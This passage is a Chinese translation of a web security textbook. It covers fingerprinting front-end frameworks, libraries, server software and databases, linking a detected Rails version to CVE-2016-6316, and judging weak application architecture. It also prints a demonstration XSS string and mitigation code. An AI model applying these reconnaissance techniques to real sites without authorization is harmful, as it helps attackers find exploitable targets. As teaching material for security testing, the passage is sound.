```javascript
// 返回根元素数组
const elements = getAllAngularRootElements();
const version = elements[0].attributes['ng-version'];

// ng-version="6.1.2"
console.log(version);
```

##### React

React 可以通过全局对象 `React` 来识别，并且与 EmberJS 一样，可以通过一个常量轻松检测其版本：

```javascript
const version = React.version;

// 0.13.3
console.log(version);
```

您可能还会注意到，带有 `type="text/jsx"` 的 script 标签引用了 React 特定的文件格式，该格式将 JavaScript、CSS 和 HTML 全部包含在同一个文件中。这是您正在处理 React 应用程序的绝对特征，并且知道组件的每个部分都源自单个 `.jsx` 文件，可以使调查单个组件变得容易得多。

##### VueJS

与 React 和 EmberJS 类似， VueJS 暴露了一个全局对象 `Vue`，并带有一个版本常量：

```javascript
const version = Vue.version;

// 2.6.10
console.log(version);
```

如果您无法在 VueJS 应用程序上检查元素，这很可能是因为该应用被配置为忽略开发者工具。这是附加在全局对象 `Vue` 上的一个可切换属性。您可以将此属性翻转为 `true`，以便重新开始在浏览器控制台中检查 VueJS 组件：

```javascript
// Vue 组件现在可以被检查了
Vue.config.devtools = true;
```

#### 检测 JavaScript 库

各种 JavaScript 辅助库多到无法计算，有些会暴露全局变量，而另一些则在不为人知的情况下运行。许多 JavaScript 库使用顶层全局对象来对其函数进行命名空间化。这些库非常容易检测和遍历。

Underscore 和 Lodash 使用下划线符号（`_`）暴露全局变量，而 jQuery 则使用 `$` 命名空间。然而，除了这些主要的库之外，您最好通过运行查询来查看加载到页面中的所有外部脚本。

我们可以利用 DOM 的 `querySelectorAll` 函数快速找到导入到页面中的所有第三方脚本列表：

```javascript
/*
 * 利用内置的 DOM 遍历功能
 * 快速生成导入到当前页面中的
 * 每个 <script> 标签的列表。
 */
const getScripts = function() {
 /*
  * 查询选择器可以以 "." 开始（如果引用 CSS 类），
  * 也可以以 "#" 开始（如果引用 `id` 属性），
  * 如果引用 HTML 元素，则没有前缀。
  *
  * 在此例中，'script' 将找到 <script> 的所有实例。
  */
 const scripts = document.querySelectorAll('script');

 /*
  * 遍历每个 `<script>` 元素，并检查该元素
  * 是否包含一个非空的源（src）属性。
  */
 scripts.forEach((script) => {
  if (script.src) {
   console.log(`i: ${script.src}`);
  }
 });
};
```

调用此函数将为我们提供如下输出：

```javascript
getScripts();

VM183:5 i: https://www.google-analytics.com/analytics.js
VM183:5 i: https://www.googletagmanager.com/gtag/js?id=UA-1234
VM183:5 i: https://js.stripe.com/v3/
VM183:5 i: https://code.jquery.com/jquery-3.4.1.min.js
VM183:5 i: https://cdnjs.cloudflare.com/ajax/libs/d3/5.9.7/d3.min.js
VM183:5 i: /assets/main.js
```

从这里开始，我们需要直接分别访问这些脚本，以确定顺序、配置等。

#### 检测 CSS 库

对用于检测脚本的算法进行微调后，我们也可以检测 CSS：

```javascript
/*
 * 利用浏览器内置的 DOM 遍历功能
 * 快速聚集每个包含 `rel` 属性且
 * 值为 `stylesheet` 的 `<link>` 元素。
 */
const getStyles = function() {
 const scripts = document.querySelectorAll('link');

 /*
  * 遍历每个脚本，并确认 `link`
  * 元素包含值为 `stylesheet` 的 `rel` 属性。
  *
  * Link 是一个多用途元素，最常用于加载 CSS
  * 样式表，但也用于预加载、图标或搜索。
  */
 scripts.forEach((link) => {
  if (link.rel === 'stylesheet') {
   console.log(`i: ${link.getAttribute('href')}`);
  }
 });
};
```

同样地，该函数将输出导入的 CSS 文件列表：

```javascript
getStyles();

VM213:5 i: /assets/jquery-ui.css
VM213:5 i: /assets/boostrap.css
VM213:5 i: /assets/main.css
VM213:5 i: /assets/components.css
VM213:5 i: /assets/reset.css
```

### 检测服务端框架

检测客户端（浏览器）上运行的软件，要比检测服务器上运行的软件容易得多。大多数情况下，客户端所需的所有代码都已下载并存储在通过 DOM 引动的内存中。某些脚本可能会在页面加载后有条件地或异步地加载，但只要您触发正确的条件，仍然可以访问这些脚本。

检测服务器具有哪些依赖关系要困难得多，但通常并非不可能。有时服务端依赖项会在 HTTP 流量（头部、可选字段）上留下独特的痕迹，或者暴露它们自己的端点。检测服务端框架需要更多关于所使用的单个框架的知识，但幸运的是，就像在客户端一样，有一些包被非常广泛地使用。如果您能记住检测这些主流包的方法，您将能够在您调查的许多 Web 应用程序中识别出它们。

#### 头部检测

一些配置不安全的 Web 服务器包在其默认头部中暴露了过多数据。一个典型的例子是 `X-Powered-By` 头部，它字面上会泄露 Web 服务器的名称和版本。在较旧版本的 Microsoft IIS 上，这通常是默认启用的。对这些存在漏洞的 Web 服务器之一发起任何调用，您应该会在响应中看到类似这样的返回值：

```http
X-Powered-By: ASP.NET
```

如果您非常幸运，Web 服务器甚至可能会提供额外的信息：

```http
Server: Microsoft-IIS/4.5
X-AspNet-Version: 4.0.25
```

聪明的服务器管理员会禁用这些头部，并聪明的开发团队会从默认配置中将它们移除。但仍有数以百万计的网站暴露着这些头部，任由任何人读取。

#### 默认错误消息和 404 页面

一些流行的框架并未提供非常简单的方法来确定所使用的版本号。如果这些框架是开源的，比如 Ruby on Rails，那么您也许能够通过指纹识别来确定所使用的版本。Ruby on Rails 是最大的开源 Web 应用程序框架之一，其源代码托管在 GitHub 上，以便于协作。不仅最新的版本可用，而且所有使用 Git 版本控制的历史版本也都可以找到。因此，每次提交（Commit）之间的具体更改可以用来对所使用的 Ruby on Rails 版本进行指纹识别。

您是否曾经访问过某个 Web 应用程序，并看到一个标准的 404 页面，或者弹出了一个开箱即用的错误消息？大多数 Web 服务器都会提供它们自己的默认错误消息和 404 页面，这些页面会一直呈现给用户，直到它们被 Web 应用程序的所有者替换为自定义的替代页面。

这些 404 页面和错误消息可以暴露相当多关于您服务器设置的情报。它们不仅会暴露您的服务器软件，而且往往还会暴露具体版本或版本范围。

以全栈 Web 应用程序框架 Ruby on Rails 为例。它有自己的默认 404 页面，这是一个 HTML 页面，其中包含一个带有“The page you were looking for doesn’t exist”字样的方框。

驱动该页面的 HTML 可以在 Ruby on Rails 的公共 GitHub 仓库中找到，文件位置为 `rails/railties/lib/rails/generators/rails/app/templates/public/404.html`。如果您在本地机器上克隆 Ruby on Rails 仓库（使用 `git clone https://github.com/rails/rails`），并开始筛选该页面的更改历史（使用 `git log | grep 404`），您可能会发现一些有趣的信息，例如：

*   2017年4月20日——在 404 页面中添加了带命名空间的 CSS 选择器
*   2013年11月21日——`U+00A0` 被替换为空格
*   2012年4月5日——移除了 HTML5 的 `type` 属性

现在，如果您在测试一个应用程序并偶然发现了它的 404 页面，您可以搜索 HTML5 的 `type` 属性 `type="text/css"`，该属性在 2012 年被移除。如果这个属性存在，说明您遇到的是 2012 年 4 月 5 日或更早发布的 Ruby on Rails 版本。

接下来，您可以寻找 `U+00A0` 字符。如果它存在，那么该应用程序的 Ruby on Rails 版本是在 2013 年 11 月 21 日或更早发布的。

最后，您可以搜索带命名空间的 CSS 选择器 `.rails-default-error-page`。如果这些不存在，那么您就知道 Ruby on Rails 的版本是在 2017 年 4 月 20 日或更早发布的。

假设您运气不错，HTML5 的 `type` 属性已被移除，且 `U+00A0` 已被空格替换，但带命名空间的 CSS 选择器尚未出现在您正在测试的 404 页面中。我们现在可以将这些时间段与 Ruby Gems 包管理器网站上列出的官方发布时间表进行交叉对比。通过这种交叉对比，我们可以确定一个版本范围。

通过这次交叉对比练习，我们可以确定正在测试的 Ruby on Rails 版本在 `3.2.16` 到 `4.2.8` 之间。恰好，Ruby on Rails 从 `3.2.x` 版本直到 `4.2.7` 版本都存在一个 XSS 漏洞，该漏洞在互联网和漏洞数据库中都有详尽的记录（CVE-2016-6316）。

这种攻击允许黑客将用引号填充的 HTML 代码注入到由 Ruby on Rails 客户端上的 Action View Tag 辅助函数读取的任何数据库字段中。此 HTML 中包含 JavaScript 代码的 Script 标签将在访问该基于 Ruby on Rails 的 Web 应用程序，并以触发 Action View 辅助函数运行的方式与其进行交互的任何设备上执行。

这仅仅是调查 Web 应用程序的依赖项和版本如何导致轻松利用的其中一个例子。我们将在本书的下一部分介绍这种类型的漏洞利用，但请记住，这些技术不仅适用于 Ruby on Rails。它们适用于任何第三方依赖项，只要您（黑客或测试人员）能够确定该应用程序所集成的软件及其版本。

#### 数据库检测

大多数 Web 应用程序使用服务端数据库（例如 MySQL 或 MongoDB）来存储有关用户、对象和其他持久性数据的状态。极少有 Web 应用程序开发人员会构建自己的数据库，因为以可靠的方式高效存储和检索大量数据并不是一项简单的任务。

如果数据库错误消息直接发送给客户端，则可以使用与检测服务器包类似的编程技术来确定数据库。但情况往往并非如此，因此您必须寻找替代的发现途径。

可以使用的一种技术是主键扫描（Primary Key Scanning）。大多数数据库支持“主键”（Primary Key）的概念，它是指在创建对象时自动生成的表（SQL）或文档（NoSQL）中的键，用于在数据库中快速执行查找。这些键的生成方法因数据库而异，并且如果开发人员有特殊需求（例如用于 URL 的较短键），有时可以进行配置。除非默认方法已被覆写，否则如果您能确定几个主流数据库默认主键的生成方式，在筛选了足够多的网络请求后，您很可能就能够确定数据库类型。

以流行的 NoSQL 数据库 MongoDB 为例。默认情况下，MongoDB 为创建的每个文档生成一个名为 `_id` 的字段。`_id` 键是使用低冲突哈希算法生成的，该算法总会产生一个长度为 12 字节的兼容十六进制的字符串。此外，MongoDB 所使用的算法在其开源文档中是公开可见的。

文档告诉我们以下内容：

*   用于生成这些 ID 的类被称为 `ObjectId`。
*   每个 ID 正好是 12 字节。
*   前 4 字节代表自 Unix 纪元以来的秒数（Unix 时间戳）。
*   接下来的 5 字节是随机的。
*   最后的 3 字节是一个以随机值开始的计数器。

一个 `ObjectId` 示例如下：`507f1f77bcf86cd799439011`。

`ObjectId` 规范还列出了像 `getTimestamp()` 这样的辅助方法，但由于我们将在客户端（而非服务器）上分析流量和数据，这些辅助方法很可能不会暴露给我们。相反，在了解了 MongoDB 主键结构的情况下，我们希望查看 HTTP 流量，并分析我们找到的具有类似外观的 12 字节字符串的 Payload。这通常很简单，您会发现一个主键存在于如下形式的请求中：

```
GET users/:id
其中 :id 是主键

PUT users, body = { id: id }
其中 id 再次为主键

GET users?id=id
其中 id 是主键，但位于查询参数（query params）中
```

有时这些 ID 会出现在您最意想不到的地方，例如在元数据中或在关于用户对象的响应中：

```json
{
 "_id": "507f1f77bcf86cd799439011",
 "username": "joe123",
 "email": "joe123@my-email.com",
 "role": "moderator",
 "biography": "..."
}
```

无论您是如何找到主键的，如果您能确定该值确实是来自数据库的主键，那么您就可以开始研究数据库，并试图将其与它们的键生成算法进行匹配。通常，这足以确定 Web 应用程序使用的是什么数据库。但时不时地，如果您遇到多个数据库使用相同的主键生成算法（例如顺序整数或其他简单模式）的情况，您可能需要将此方法与另一种技术（例如强制产生错误消息）结合使用。

### 本章小结

许多年来，就源代码而言，第一方应用程序代码是最常见的攻击向量。但由于现代 Web 应用程序对第三方和开源集成的依赖，这种情况如今正在发生改变。

对目标的第三方集成建立深入的理解，可能会引导您发现应用程序中已可被利用的安全漏洞。这些漏洞对于应用程序的所有者来说往往也难以检测。除此之外，理解第三方依赖项在您自己的代码库中的使用方式，能够让您缓解因劣质的集成技术或与不够安全的库进行集成（在有更安全的选择可用时）而引入的风险。

总之，由于当今大多数应用程序底层运行的代码量巨大，第三方集成几乎是必不可少的。从头开始构建一个完整、庞大的全栈 Web 应用程序将是一项英雄史诗般艰巨的任务。因此，理解用于寻找和评估应用程序中依赖关系的技术，正成为安全行业中每个从业人员必须掌握的技能。

---

## 第 7 章 识别应用程序架构中的薄弱点

到目前为止，我们已经讨论了许多用于识别 Web 应用程序中组件、确定 Web 应用程序中 API 结构以及了解 Web 应用程序如何期望与用户浏览器进行交互的技术。每种技术本身都是有价值的，但如果将从它们中收集到的信息以有组织的方式结合起来，甚至可以获得更多的价值。

理想情况下，如前所述，您在整个侦察过程中都在记录某种形式的笔记。妥善地记录您的研究成果是必不可少的，因为某些 Web 应用程序的规模如此之大，以至于探索其所有功能可能需要数月之久。在侦察期间创建的文档数量最终取决于您（测试人员、黑客、爱好者、安全工程师等），如果不进行正确的优先级排序，数据多并不一定更有价值，尽管数据多总比没有数据好。

对于您测试的每个应用程序，理想情况下您最终都会拥有一套井井有条的笔记。这些笔记应该涵盖：

*   Web 应用程序中使用的技术
*   按 HTTP 动词分类的 API 端点列表
*   API 端点结构的列表（在可行时提供）
*   Web 应用程序中包含的功能（例如：评论、身份验证、通知等）
*   Web 应用程序使用的域名
*   发现的配置（例如：内容安全策略（Content Security Policy，CSP））
*   身份验证/会话管理系统

一旦您完成了这个列表的编制，您就可以使用它来为攻破应用程序或寻找漏洞的任何尝试排列优先级。

与普遍看法相反，Web 应用程序中的大多数漏洞源于设计不当的应用程序架构，而不是编写拙劣的方法（Method）。当然，将用户提供的 HTML 直接写入 DOM 的方法绝对是有风险的，并且可能允许用户上传脚本（如果没有进行适当的净化（Sanitization）），并在另一个用户的机器上执行该脚本（XSS）。

但有些应用程序存在数十个 XSS 漏洞，而同行业中其他类似规模的应用程序却几乎为零。归根结底，一个应用程序的架构以及该应用程序内模块/依赖项的架构，是可能产生漏洞的薄弱点的绝佳标志。

### 安全与不安全架构的信号

如前所述，单个 XSS 漏洞可能是编写拙劣的方法导致的结果。但多个漏洞很可能是应用程序架构薄弱的信号。

让我们想象两个简单的应用程序，它们允许用户向其他用户发送直接消息（文本）。其中一个应用程序容易受到 XSS 攻击，而另一个则不会。

不安全的应用程序在向 API 端点发起存储评论的请求时，可能不会拒绝脚本；它的数据库可能不会拒绝该脚本，并且它可能不会对代表该消息的字符串执行适当的过滤和净化。最终，它被加载到 DOM 中，并被作为 DOM 消息 `<script>alert('hacked');</script>` 进行解析，从而导致脚本执行。

另一方面，安全的应用程序可能具有前述的一种或多种保护措施。然而，在针对每个具体情况实现多种此类保护措施，在开发人员时间方面将是昂贵的，并且很容易被忽视。

如果一个应用程序的架构本质上是不安全的，那么即使是由精通应用程序安全的工程师编写的应用程序，最终也可能会出现安全漏洞。这是因为安全的应用程序在功能开发之前*和*期间都会实现安全机制，而安全性中等的应用程序在功能开发时才会实现安全机制，而不安全的应用程序则可能根本不实现任何安全机制。

如果开发人员必须在 5 年的时间跨度内，在前述示例的即时消息（Instant Messaging，IM）系统上编写 10 个变体，那么每个实现很可能在结构上是不同的。然而，每个实现之间的安全风险大体上是相同的。

这些 IM 系统中的每一个都包含以下功能：

*   用于编写消息的 UI
*   用于接收刚刚编写并提交的消息的 API 端点
*   用于存储消息的数据库表
*   用于检索一条或多条消息的 API 端点
*   用于显示一条或多条消息的 UI 代码

最起码，应用程序代码看起来像这样：

**client/write.html**

```html
<!-- 消息输入的标准 UI -->
<h2>Write a Message to <span id="target">TestUser</span></h2>
<input type="text" class="input" id="message"></input>
<button class="button" id="send" onclick="send()">send message</button>
```

**client/send.js**

```javascript
const session = require('./session');
const messageUtils = require('./messageUtils');

/*
 * 遍历 DOM 并收集两个值：要发送的消息内容，
 * 以及目标消息接收者的用户名或其他唯一标识符（id）。
 *
 * 调用 messageUtils 生成一个经过验证的 HTTP 请求，
 * 将提供的数据（消息、用户）发送到服务器上的 API。
 */
const send = function() {
 const message = document.querySelector('#send').value;
 const target = document.querySelector('#target').value;
 messageUtils.sendMessageToServer(session.token, target, message);
};
```

**server/postMessage.js**

```javascript
const saveMessage = require('./saveMessage');

/*
 * 从客户端的 send.js 接收数据，验证用户的权限，
 * 如果所有验证检查均通过，则将提供的消息保存到数据库中。
 *
 * 如果成功，返回 HTTP 状态码 200。
 */
const postMessage = function(req, res) {
 if (!req.body.token || !req.body.target || !req.body.message) {
  return res.sendStatus(400);
 }
 saveMessage(req.body.token, req.body.target, req.body.message)
 .then(() => {
  return res.sendStatus(200);
 })
 .catch((err) => {
  return res.sendStatus(400);
 });
};
```

**server/messageModel.js**

```javascript
const session = require('./session');

/*
 * 代表一个消息对象。充当 Schema（模式），使得所有消息对象
 * 都包含相同的字段。
 */
const Message = function(params) {
 user_from: session.getUser(params.token),
 user_to: params.target,
 message: params.message
};

module.exports = Message;
```

**server/getMessage.js**

```javascript
const session = require('./session');

/*
 * 从服务器请求消息，验证权限，如果
 * 成功，从数据库中提取消息，然后通过客户端
 * 将消息返回给请求它的用户。
 */
const getMessage = function(req, res) {
if (!req.body.token) { return res.sendStatus(401); }
if (!req.body.messageId) { return res.sendStatus(400); }

session.requestMessage(req.body.token, req.body.messageId)
.then((msg) => {
  return res.send(msg);
 })
 .catch((err) => {
  return res.sendStatus(400);
 });
};
```

**client/displayMessage.html**

```html
<!-- 显示从服务器请求的单条消息 -->
<h2>Displaying Message from <span id="message-author"></span></h2>
<p class="message" id="message"></p>
```

**client/displayMessage.js**

```javascript
const session = require('./session');
const messageUtils = require('./messageUtils');

/*
 * 利用一个辅助工具（util）通过 HTTP GET 请求单条消息，
 * 然后将其附加到 #message 元素中，同时将作者
 * 附加到 #message-author 元素中。
 *
 * 如果 HTTP 请求未能成功获取消息，则将错误记录到控制台。
 */
const displayMessage = function(msgId) {
messageUtils.getMessageById(session.token, msgId)
.then((msg) => {
  messageUtils.appendToDOM('#message', msg);
  messageUtils.appendToDOM('#message-author', msg.author);
})
.catch(() => console.log('an error occured'));
};
```

保护这个简单应用程序所需的许多安全机制可以、且很应该被抽象到应用程序架构中，而不是在个案的基础上单独实现。

以 DOM 注入为例。一个内置于 UI 中的简单方法（如下所示）将能消除大部分 XSS 风险：

```javascript
import { DOMPurify } from '../utils/DOMPurify';
// 使用了：https://github.com/cure53/DOMPurify

const appendToDOM = function(data, selector, unsafe = false) {
 const element = document.querySelector(selector);

 // 针对需要 DOM 注入的情况（非默认行为）
 if (unsafe) {
  element.innerHTML = DOMPurify.sanitize(data);
 } else { // 标准情况（默认行为）
  element.innerText = data;
 }
};
```

仅仅围绕这样一个函数来构建您的应用程序，就可以极大地降低您代码库中出现 XSS 漏洞的风险。

然而，此类方法的实现非常重要——请注意，前述代码示例中的 DOM 注入标志被特意标记为了 `unsafe`（不安全）。它不仅在默认情况下处于关闭状态，而且还是函数签名中的最后一个参数，这意味着它不太可能被无意中开启。

像前述的 `appendToDOM` 方法这样的机制是安全应用程序架构的指示器。缺乏这些安全机制的应用程序更有可能包含漏洞。这就是为什么识别不安全的应用程序架构对于寻找漏洞和确定代码库改进的优先级都至关重要的原因。

### 多层安全防御

在前面的示例中（我们考虑了一个消息服务的架构），我们分离并识别了可能发生 XSS 风险的多个层级。这些层级包括：

*   API POST 层
*   数据库写入层
*   数据库读取层
*   API GET 层
*   客户端读取层

对于其他类型的漏洞，如 XXE 或跨站请求伪造（Cross-Site Request Forgery，CSRF），情况也是如此——由于在多个层级上的安全机制不足，每个漏洞都可能发生。例如，让我们想象一个假设的应用程序（比如消息应用）在 API POST 层添加了机制，通过净化（Sanitize）用户发送的有效载荷（消息）来消除 XSS 风险。现在，可能已经无法通过 API POST 层部署 XSS 了。

然而，在稍后的时间点上，可能会开发并部署另一种发送消息的方法。例如，一个新的 API POST 端点，它接受消息列表以支持群发消息。如果新的 API 端点没有提供与原端点同样强大的净化功能，它可能会被用来向数据库上传包含脚本的有效载荷，从而绕过开发人员在单条消息 API 中的最初意图。

我提出这一点是作为一个简单的例子，以指出一个应用程序的安全性仅取决于其架构中最薄弱的环节。如果该服务的开发人员在多个位置（例如 API POST 和数据库写入阶段）都实现了机制，那么新的攻击本可以被缓解。

有时，不同的安全层级可以支持不同的机制来防御特定类型的攻击。例如，API POST 可以调用无头浏览器（Headless Browser），并尝试模拟消息在页面上的渲染，如果检测到任何脚本执行，则拒绝该消息有效载荷。涉及无头浏览器的缓解措施在数据库层或客户端层是无法实现的。

不同的机制也可以检测不同的攻击有效载荷。无头浏览器可能会检测到脚本执行，但如果浏览器特定的 API 存在漏洞，该脚本仍有可能绕过此机制。发生这种情况是因为有效载荷可能不会在无头浏览器中执行，而只会在拥有存在漏洞的浏览器版本的用户浏览器中执行（这与在服务器上测试的浏览器或版本不同）。

所有这些例子都表明，最安全的 Web 应用程序在许多层级上都引入了安全机制，而安全性较差的 Web 应用程序仅在一个或两个层级上引入安全机制。在测试 Web 应用程序时，您需要寻找那些仅使用了少量安全机制或需要大量层级（因此在安全机制与层级的比例上可能较低）的应用程序功能。如果您能分离并确定哪些功能符合这些标准，在寻找漏洞时应该将它们置于其他功能之上，因为它们更有可能被成功利用。

### 技术引入与重复造轮子

需要注意的最后一个风险因素是开发人员想要重新发明现有技术（即重复造轮子）的欲望。通常，这并不是从架构问题开始的。相反，它通常是一个组织管理问题，并反映且显现在应用程序架构中。

这在许多软件公司中很常见，因为从开发的角度来看，重新发明工具或功能会带来许多好处，包括：

*   避免复杂的许可（License）协议
*   为该功能添加额外的功能
*   通过营销新工具或新功能来创造知名度

除此之外，从头开始创建一个功能通常比重新利用现有的开源或付费工具要有趣和有挑战性得多。但重复造轮子并不总是坏事，因此必须对每种情况进行评估。

在某些情况下，重新发明现有软件可能会给公司带来更多的好处，而不是陷阱。例如，如果最优秀的工具有一个要求支付巨额佣金的许可协议，从而导致负利润率，或者该协议禁止进行修改，从而导致应用程序不得不放弃核心功能。

另一方面，从安全的角度来看，重复造轮子是有风险的。风险的大小取决于被重新发明的具体功能，但其范围可以从温和的安全风险一直延伸到极端的安全风险。

特别是，经验丰富的安全工程师建议绝不要自己编写加密算法（Never roll your own cryptography）。才华横溢的软件工程师和数学家也许能够开发出他们自己的哈希算法，以避免使用公开的算法——但代价是什么呢？

考虑哈希算法 SHA-3。SHA-3 是一种开源哈希算法，是 SHA 算法家族的一部分，该算法已经开发了将近 20 年，并接受了美国国家标准与技术研究院（NIST）的严格测试，以及来自美国最大安全公司的贡献。

由哈希算法生成的哈希值经常受到多种攻击向量（例如：组合器攻击、马尔可夫攻击等）的攻击。开发人员编写的哈希算法必须具备与最顶尖的公开算法相同的鲁棒性。

要推出一个与 NIST 和其他机构在开发 SHA-3 时所提供的测试同等广泛的算法，将花费一个组织数千万美元。但是，通过使用零成本，该组织可以从像 OpenJDK 这样的来源中采用 SHA-3 的实现，并且仍然可以获得来自 NIST 和社区测试的所有好处。

决定自己推出哈希算法的单个软件开发人员很可能无法达到相同的标准并进行严格的测试。结果，该组织的核心数据将成为黑客的容易攻击的目标。

那么，我们该如何确定哪些功能或工具应该引入，哪些应该重新发明呢？一般来说，一个架构安全的应用程序只会重新发明纯功能性的功能，例如重新发明用于存储评论的 Schema 或通知系统。

Web 应用程序开发人员可能应该避开那些需要数学、操作系统或硬件方面深厚专业知识的功能。这包括数据库、进程隔离和大多数内存管理。

一个人不可能成为所有领域的专家。一个优秀的 Web 应用程序开发人员理解这一点，并将他们的精力集中在开发他们所擅长的专业领域上，并在其主要领域之外工作时寻求帮助。相反，糟糕的开发人员往往会尝试重新发明核心功能——这并不少见！

充斥着自定义数据库、自定义加密和特殊硬件级优化的应用程序通常最容易被攻破。这条规则可能存在极少数例外，但它们是特例，而不是常态。

### 本章小结

当我们在谈论 Web 应用程序中的漏洞时，我们通常是在谈论发生在代码层面上的问题，或者是由于编写不当的代码而导致的问题。然而，在代码层面上出现的问题，在更早期的应用程序架构中很容易被发现。通常，根据应用程序的防御机制如何在整个代码库中设计和分布，应用程序的架构设计要么会导致大量的安全漏洞，要么会导致相对较少的安全漏洞。

因此，识别应用程序架构中薄弱点的能力是一种非常有用的侦察技术。在寻找漏洞时，应该首先关注架构不佳的功能，因为通常具有良好安全架构的功能在从一个端点跳转到另一个端点，或尝试绕过过滤系统时会保持更强的一致性。

应用程序架构通常是在非常高的层面上进行讨论的，而不是在大多数安全工作发生的较低层面上。如果您不习惯从设计的角度来审视应用程序，这可能会使其成为一个令人困惑的话题。

在作为侦察工作的一部分对 Web 应用程序进行调查时，请务必在绘制应用地图时考虑应用程序的整体安全架构。掌握架构分析不仅能帮助您在寻找漏洞时集中精力，还可能通过发现导致先前功能中出现漏洞的模式，帮助您识别未来功能中的薄弱架构。

---

以下是本书第 8 章及后续内容的完整翻译。译文严格保持了原文的段落结构、Markdown 格式、代码块、命令行、URL 以及专业术语的翻译规范。

---

## 第 8 章：第一部分总结

到目前为止，你应该已经对 Web 应用程序侦察（Reconnaissance）的目的有了坚实、基础的理解，并掌握了一些可用于构建你自己的侦察工具箱的技术。侦察技术在不断演变，因此很难准确判断哪些技术优于其他技术。正因如此，你应当始终寻找新颖且有趣的侦察技术——特别是那些能够快速执行并实现自动化的技术，以省去本需用于重复手动工作的宝贵时间。

随着时间的推移，你的旧技术可能会过时，你可能不得不开发更新的技术来替代它们。例如，Web 服务器软件包的安全性会随着时间的推移而不断提高，它们现在正尽最大努力防止任何可能泄露 Web 服务器软件和版本号的状态信息。

你侦察工具箱中的基本技能可能永远不会完全消失，但你会发现新技术在不断涌现。除了理解当前时代的技术和传统技术外，你还需要开发绘制新技术图谱的方法。

在第一部分中，我强调了记录和整理侦察发现的重要性。但我还建议记录并保存你的侦察技术。最终，你的侦察工具箱将不断扩展，涵盖许多独特的技术、框架、版本和方法论。

以有效的方式记录和整理你的侦察技术，将使其在未来更容易转化为自动化工具，或者在你处于导师角色时更方便向他人传授。很多时候，强大的侦察技术仅作为机构内部知识（Institutional Knowledge）而被保留。如果你开发了有效的新侦察技术，请务必考虑将其分享给更广泛的安全社区。你所发现的技术不仅会给渗透测试员（Penetration Tester）提供帮助，还可能推动应用程序安全的发展。

归根结底，你选择如何积累、记录和分发这些技术完全取决于你。我希望本书中奠定的基础能成为你侦察工具箱中的基石，并在你未来探索应用程序安全世界的过程中为你提供助力。

---

# 第二部分：进攻

在本书的第一部分中，我们探索了许多调查和记录 Web 应用程序结构及功能的方法。我们评估了在服务器上寻找 API（Application Programming Interface，应用程序编程接口）的方法，包括那些存在于子域名（Subdomain）而非仅存在于顶级域名上的接口。我们考虑了枚举这些 API 所暴露的端点（Endpoint）及其接受的 HTTP 谓词的方法。

在构建了子域名、API 和 HTTP 谓词的图谱之后，我们探讨了如何确定每个端点所能接受的请求（Request）和响应负载（Response Payload）类型。我们从通用角度，以及通过寻找能让我们更快掌握负载结构的公开规范的方法，来对这一问题进行了研究。

在研究了绘制应用程序 API 结构图谱的方法之后，我们开始讨论第三方依赖（Third-Party Dependency），并评估了在第一方应用程序上检测第三方集成的各种方法。通过这次调查，我们学会了如何检测单页面应用（Single-Page Application，SPA）框架、数据库和 Web 服务器，并掌握了识别其他依赖版本的通用技术（如指纹识别）。

最后，我们通过讨论可能导致功能保护不力的架构缺陷，总结了关于侦察的对话。通过评估几种常见的不安全 Web 应用程序架构形式，我们深入了解了仓促开发的 Web 应用程序所面临的危险。

现在，在第二部分中，我们将开始学习黑客用来入侵现代 Web 应用程序的常用技术。在开始第二部分之前，理解第一部分中的技术会非常有用。

接下来几页中介绍的许多攻击都非常强大，有时甚至很容易部署，但它们并不适用于所有的 API 端点、HTML 表单或 Web 链接。在寻找将第二部分中的漏洞利用（Exploit）应用于真实 Web 应用程序的方法时，我们可以利用第一部分中的侦察技术。在这里，我们将学习源于不安全 API 端点、用户界面（User Interface，UI）中不安全的 Web 表单、设计不良的浏览器标准、配置不当的服务器端解析器等漏洞的攻击。

通过应用第一部分中的概念，我们可以发现 API 端点并确定它们是否以不安全的方式编写。我们还可以评估客户端（浏览器）代码，以查看其处理文档对象模型（Document Object Model，DOM）操作的方式是正确的还是不安全的。对客户端框架进行指纹识别对于发现应用程序 UI 中的弱点非常有用，因为客户端代码存储在本地，极易进行评估。如你所见，本书中的技术是环环相扣、层层递进的。

在接下来的几章中，你将学习如何通过许多强大且常见的漏洞利用技术来攻破 Web 应用程序。在学习这些技术时，结合前一部分的经验，并尝试思考那些侦察技术在帮助你寻找应用程序弱点方面有哪些用处，从而将你在接下来的内容中学到的漏洞利用手段成功付诸实践。

---

## 第 9 章：黑客入侵 Web 应用程序简介

在第二部分中，我们将在侦察技能的基础上，学习我们可以用来利用 Web 应用程序漏洞的具体攻击手段。在这里，你将学习如何扮演黑客的角色。

我们将使用一系列广泛的漏洞利用手段来攻击第一部分中介绍的虚拟 Web 应用程序 `mega-bank.com`，所有这些漏洞在当今许多 Web 应用程序中都极其常见。只要你能够灵活运用第一部分中的技能和技术，从第二部分中获得的技能就可以轻松迁移到其他环境中。到第二部分结束时，你既能掌握在应用程序中寻找可利用漏洞所需的侦察技能，也能掌握构建和部署利用这些安全漏洞的有效载荷所需的进攻性黑客技能。

### 黑客思维

成为一名成功的黑客需要的不仅仅是一套可客观衡量的技能和知识，还需要一种非常特殊的思维方式。

软件工程师通过为现有代码库增加功能或进行改进来衡量生产力。一位软件工程师可能会说：“我添加了功能 X 和 Y，因此今天过得很充实。”或者，他们可能会说：“我将功能 A 和 B 的性能提升了 10%。”这表明，虽然软件工程师的工作与传统职业相比难以衡量，但仍然是可以进行量化评估的。

黑客衡量生产力的方法则要隐蔽得多，也更难测量。这是因为黑客行为的绝大部分实际上是数据收集 and 分析。在门外汉看来，这个过程往往充斥着误报（False Positive），甚至看起来像是在浪费时间。

大多数黑客并不拆解或修改软件，而是分析软件，以便利用现有的代码库——他们寻找现成的入口点（Entrypoint），而不是自己制造入口。通常，在寻找入口点时用于分析应用程序的技能与本书第一部分中介绍的技能极其相似，甚至完全相同。

任何给定的代码库都充满了潜在的可利用缺陷。一个好的黑客会不断寻找能够引导其发现漏洞的线索。

不幸的是，这项工作的性质意味着，即使是优秀的黑客也可能会在很长一段时间内一无所获。在找到合适的入口点并设计、投递漏洞利用程序之前，花费数周甚至数月的时间来分析一个 Web 应用程序是完全可能的。

作为一名黑客，你需要不断强化寻找和投放载荷的重要性。除此之外，你还必须仔细记录以前的尝试以及从中吸取的教训。当你从探索小型应用程序转向攻击更大型的应用程序（特别是以关键功能或数据为目标时），在记录先前工作时的细节关注将是至关重要的。

正如我们在软件安全历史中看到的那样，黑客也必须不断提升自己的技能水平，否则就会被那些旨在将其阻挡在软件之外的人击败。这意味着黑客必须持续学习，因为随着 Web 的适应和发展，旧技术可能会贬值。

